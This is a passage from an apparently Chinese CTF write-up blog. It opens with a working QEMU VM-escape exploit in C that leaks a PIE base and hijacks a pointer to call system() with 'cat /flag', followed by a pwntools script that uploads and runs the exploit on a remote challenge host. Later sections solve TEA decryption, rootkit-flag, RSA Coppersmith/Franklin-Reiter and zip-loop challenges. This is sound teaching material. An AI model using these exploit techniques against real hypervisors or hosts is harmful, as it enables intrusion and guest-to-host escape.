class="number">1</span>,<span class="string">"start\n"</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, <span class="number">0x101002</span>);<span class="comment">//fea00000</span></span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">1</span>, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf("mmio_mem @ %p\n", mmio_mem);</span></span><br><span class="line">        <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf=gva_to_gpa(userbuf);</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",userbuf);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(void*)phy_userbuf);</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">	    dst = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	    mlock(dst, <span class="number">0x2000</span>);</span><br><span class="line">	    phy_dst=gva_to_gpa(dst);</span><br><span class="line">	    phy_dst2=gva_to_gpa(dst+<span class="number">0x1000</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>((phy_dst2 - phy_dst != <span class="number">0x1000</span>));</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",dst);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(uint64_t*)phy_dst);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address2: %p\n",(uint64_t*)phy_dst2);</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">	    src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	    mlock(src, <span class="number">0x2000</span>);</span><br><span class="line">	    phy_src=gva_to_gpa(src);</span><br><span class="line">	    phy_src2=gva_to_gpa(src+<span class="number">0x1000</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>((phy_src2 - phy_src != <span class="number">0x1000</span>));</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",src);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(uint64_t*)phy_src);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address2: %p\n",(uint64_t*)phy_src2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"step2\n"</span>,<span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_src= phy_src;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x100</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_dst= phy_dst;</span><br><span class="line">    ((<span class="keyword">uint64_t</span>*)src)[<span class="number">0</span>]=<span class="number">0x123456</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span>*)src)[<span class="number">1</span>]=<span class="number">0x123456</span>;</span><br><span class="line">    <span class="comment">//0x7f3fd4000000</span></span><br><span class="line">    </span><br><span class="line">    set_cp_list_cnt(<span class="number">1</span>);</span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    do_cp(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    	sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x1020</span>;</span><br><span class="line">    </span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    </span><br><span class="line">    do_cp(<span class="number">4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    	sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pie_base = *(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1010</span>) - <span class="number">0x4dce80</span>;</span><br><span class="line">    <span class="comment">//printf("pie_base : %p\n",pie_base);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,&amp;pie_base,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"step3\n"</span>,<span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> system = <span class="number">0x2C2180</span> + pie_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> sh = (*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1018</span>));</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_src= phy_src;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x1020</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_dst= phy_dst;</span><br><span class="line">    </span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1000</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1000</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1008</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1008</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1010</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1010</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1018</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1018</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1010</span>))=system;</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1018</span>))=sh+<span class="number">0xa00</span>+<span class="number">0x100</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x100</span>))=<span class="string">'c'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x101</span>))=<span class="string">'a'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x102</span>))=<span class="string">'t'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x103</span>))=<span class="string">' '</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x104</span>))=<span class="string">'/'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x105</span>))=<span class="string">'f'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x106</span>))=<span class="string">'l'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x107</span>))=<span class="string">'a'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x108</span>))=<span class="string">'g'</span>;</span><br><span class="line">    set_cp_list_cnt(<span class="number">0x11</span>);</span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    </span><br><span class="line">    do_cp(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    	sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf("system_addr : %p\n",*(uint64_t*)(dst));</span></span><br><span class="line">    do_cp(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">os.system(<span class="string">'gcc -e main -static ./exp.c -o ./exp -nostdlib'</span>)</span><br><span class="line">os.system(<span class="string">'strip ./exp'</span>)</span><br><span class="line">os.system(<span class="string">'upx ./exp'</span>)</span><br><span class="line">f = open(<span class="string">"exp"</span>, <span class="string">"rb"</span>)</span><br><span class="line">exp = f.read()</span><br><span class="line">f.close()</span><br><span class="line">print(len(exp))</span><br><span class="line">step = <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'118.195.171.57'</span>,  <span class="number">443</span>)</span><br><span class="line">r.recvuntil(<span class="string">'VMEscape login:'</span>)</span><br><span class="line">r.sendline(<span class="string">'root'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'uploading...'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(exp)/step+<span class="number">1</span>):</span><br><span class="line">    b64_exp = base64.b64encode(exp[step*i:step*(i+<span class="number">1</span>)])</span><br><span class="line">    r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">    r.sendline(<span class="string">'echo %s &gt;&gt; ./b64_exp'</span>%b64_exp)</span><br><span class="line">log.success(<span class="string">'upload success'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'base64 -d ./b64_exp &gt; ./exp'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'chmod 777 exp'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'./exp'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="aet-reverse"><a href="#aet-reverse" class="headerlink" title="aet-reverse"></a>aet-reverse</h2><p>tea加密相关的，抄代码，然后将顺序调换即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode</span><span class="params">(<span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v7 = (<span class="number">3</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">24</span>) | <span class="number">4</span>;</span><br><span class="line">  v6 = (<span class="number">7</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">24</span>) | <span class="number">8</span>;</span><br><span class="line">  v5 = (<span class="number">11</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">10</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">9</span> &lt;&lt; <span class="number">24</span>) | <span class="number">12</span>;</span><br><span class="line">  v4 = (<span class="number">15</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">14</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">13</span> &lt;&lt; <span class="number">24</span>) | <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="number">4</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0x20</span>*<span class="number">0x9E3779B9</span>;</span><br><span class="line">    v12 = ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">2</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">1</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">16</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">3</span> + a2))&amp;<span class="number">0xff</span>;</span><br><span class="line">    v11 = ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">6</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">5</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">16</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">4</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">7</span> + a2)&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x1F</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 -= (v12 + v10) ^ (<span class="number">16</span> * v12 + v5) ^ ((v12 &gt;&gt; <span class="number">5</span>) + v4);</span><br><span class="line">      v12 -= (v11 + v10) ^ (<span class="number">16</span> * v11 + v7) ^ ((v11 &gt;&gt; <span class="number">5</span>) + v6);</span><br><span class="line">      v10 -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + a2) = (v12/<span class="number">0x1000000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">1</span> + a2) = (v12/<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">2</span> + a2) = (v12/<span class="number">0x100</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">3</span> + a2) = (v12)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">4</span> + a2) = (v11/<span class="number">0x1000000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">5</span> + a2) = (v11/<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">6</span> + a2) = (v11/<span class="number">0x100</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">7</span> + a2) = (v11)&amp;<span class="number">0xff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0x20</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">strcpy</span>(a,<span class="string">"\x42\xC7\xCA\x40\xC1\x75\x16\xEF\xE7\x37\x6E\x69\x1B\x0B\x0F\x78\xDF\xE0\xE0\x7B\x5F\x50\x57\x05\xF4\x73\xD2\x35\x47\xD5\x6C\x5A"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,a);</span><br><span class="line">	decode(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h2><p>根据题目提示直接搜索rootkit即可在附近发现flag：</p>
<p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210824144547.png" alt="image-20210823152243990"></p>
<h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>流量包中可以发现两个密文：</p>
<p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210824144542.png" alt="image-20210823152307164"></p>
<p>因为只是padding不同，且位数较短，利用<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html" target="_blank" rel="noopener">Franklin-Reiter攻击</a>方法，在<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sage</a>上执行代码即可获得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    c1 =<span class="number">226199888918448644756982227968746328321985116022301858554198443672166664046511192215268564345898426376094090283902459640110441636420726770010000770994806563185277269200465979320365589893377418069091918532090442396603886751603663167305733566867710881487792435263851954036765024355077627565776101657845285994047225127259478223888842725657697619882058952675576467950522546405944727325816748748400930757072151974753803411875075825410215662132323783283622907642504349895222420194846774972358784353404930471430363282533597528847457511272893938256828008761907527515772662467469811929535936626565593800263948227574689518705440414368634213587105988741446978367368641973256822769215908784220309789734449328751828411012817796805182907296099522060377249696752489510340595152805018457215119257756500416362241433542631282380670560802965990054464183825706649810872267539076088793023183611390929368000088538174212497557317021558232130649505658714311457845634746833717519922531826151283006638342214774466523934632839617828984102088907011083393633695252458688340500110194100303563736683350582103762865754280928068416609493507422758397519930389697891015054896887103350205876203508540259064385048758693455947681367170495861484799223471818419141809766082</span></span><br><span class="line">    c2 =<span class="number">207745134179372733555510206619693253104579843394896629739037329373112962626246001660692996105153219118802888232147542928402067843843528586661320609669764821619654148259323979346482619518127693134276997096465301242211338219230471535362522814373937363157952621289752500159789059618277078792730676938098151778724478618510442014061057398587899271302933994977686954557140792181120737121774640968270568182678321489463357386240195482174580855571460603588887113368877542370808084357842481355072918452814741564939655765498035870034623573615277107259501397135275787715228937905326258102800307298720705403841763666842176243959137647629868288744563301081604801635616954497347143042211051515138964208862089552048752128912810909730479659450966735343696566762894334249104817494914722566979492521404452789748171845406174662299522224640406957367515731398609433619859550730046552804426613174272338408295496475455377327126232203966170727191424458552984898420495331422888174501682405492889556485885498653026394829501033795561393942827468916484256939660461234831948497296037001984268948594694380490331513700030501310813656424424549981824937813623457529801230191235415350842735918693953674061739761952989693408739389294218794993885245118233185798993030811</span></span><br><span class="line">    n =<span class="number">614841097302605203729955929451825826385630731245407304765444050136152160075416270232196891310754756560269306196561606156336813576913594854840164982931848631424774407292521710362012687934093478900284954122708280664707569091235654868301000525395360078939629380968427451630817415966643152395544725253378817336057650951709472150327395955690738068905556599556048143267959045123493403335580464278218470115001795745184558268225092224619641577591099718668732317701349174398992357749748300972812469018580873052325022765470680889385640174127657770334108999912438577122235575684290868585158464471335044106696596310903161046624897870198499582743991296379992702316645220124590338066703166528127792814503559512520239899562796644117918668854617138574268684819163423283186676870272524173353359508565110680846340027745804501343277615801570161341159399030712301208921532219260984718701528073369562514559969874210515647810613697008011307213411257388079256334292994617864207389735727092704030522132125141994059978274145655095107101848352464355417969218835698138188967409918358594915938655738516761338882364547606993485361276412819595508391665123030799494192932148904512867616718323946620838822942360634114453262536609403878810013093786418173028142285209</span></span><br><span class="line">    e =<span class="number">7</span></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(binascii.unhexlify(<span class="string">"%x"</span> % int(m1)))</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'You are so good at Coppersmith! Here is flag: flag&#123;congratulations_let#s_hacK_4_fun&#125;J"\xdd\x03'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<h2 id="prophet"><a href="#prophet" class="headerlink" title="prophet"></a>prophet</h2><p>压缩包的密码是压缩包名，写个脚本循环解压：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">filename = <span class="string">"2907706324.zip"</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">while</span> (filename.endswith(<span class="string">".zip"</span>) <span class="keyword">and</span> filename != <span class="string">"unknown.zip"</span>):</span><br><span class="line">    data.append(filename.strip(<span class="string">".zip"</span>))</span><br><span class="line">    file = zipfile.ZipFile(filename)</span><br><span class="line">    nextFile = file.namelist()[<span class="number">0</span>]</span><br><span class="line">    file.extractall(pwd=bytes(filename.split(<span class="string">"."</span>)[<span class="number">0</span>], encoding=<span class="string">'ascii'</span>))</span><br><span class="line">    filename = nextFile</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>

<p>最后会解压到 unknown.zip，用Python的 randcrack 库，首先在前面的解压中把随机数整理后得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2907706324, 3954914986, 3402108112, 2054213659, 535557466, 3669544554, 2651712950, 3417770286, 4111425735, 3450915372, 3509237967, 2707743668, 889955106, 101861478, 1336215387, 3605515990, 2504989551, 1349201253, 2648082710, 2601629531, 318049225, 645746114, 3181236701, 1354915347, 4222461704, 843752451, 304987850, 818779778, 2376864436, 4258684562, 3790514089, 2536866185, 3429670676, 700863894, 2368789662, 2954948787, 1850501693, 1935300318, 4294954886, 73605939, 790901430, 3142640071, 3691984007, 1373060993, 903416285, 3121969731, 1482630290, 3383153547, 4063302022, 3991027797, 4137420745, 3132346033, 1308129484, 3547926414, 3109764388, 708591644, 1817081225, 2668947004, 4263919904, 1115482359, 3856868064, 2830700281, 2281684679, 690656972, 1556659173, 3404632260, 3760484167, 1087153620, 4194906349, 1078862195, 2976233215, 1912726912, 30407312, 3942988489, 3908451981, 3898279239, 3281283879, 3497758064, 2782905320, 2430005846, 2035396750, 4225190092, 2269868098, 3586253265, 941460198, 714278381, 3535781796, 224084415, 1439629664, 4073938538, 3695945333, 3790821082, 1641312648, 3482321608, 3915303085, 1915159805, 3430976961, 1840044358, 3171835875, 2774047027, 1987332515, 3855846206, 2973653262, 3838867780, 611114104, 226329481, 1915513324, 3700256481, 43035897, 497049019, 4217044844, 2614275824, 744712097, 182795116, 2163976688, 4263470614, 725414906, 921626470, 3746191361, 1308296962, 1147642242, 4092217985, 3542284802, 1521845264, 2075371081, 816611597, 3041634562, 233907246, 1795167862, 3915308548, 491352142, 930583074, 1708980296, 308506013, 3810969309, 3157296753, 2967229333, 1571219325, 1291393249, 1593315655, 3882964486, 1017041435, 1857378099, 1824352034, 3349753470, 674061228, 1009504030, 2542637984, 371165771, 2479782679, 1480344967, 2869593526, 1330829984, 2722781682, 283801038, 3707346602, 4001933200, 2349491114, 1250027640, 1970245425, 171593507, 826464228, 2984624889, 1700335730, 1127890176, 2298521410, 3038015291, 3114969709, 2198496951, 3020449005, 2670289699, 1384619269, 691171966, 3223611927, 2151567537, 1625186327, 2435311123, 3729455475, 2620432733, 3211878875, 241902387, 422789850, 1633356868, 244191996, 499735365, 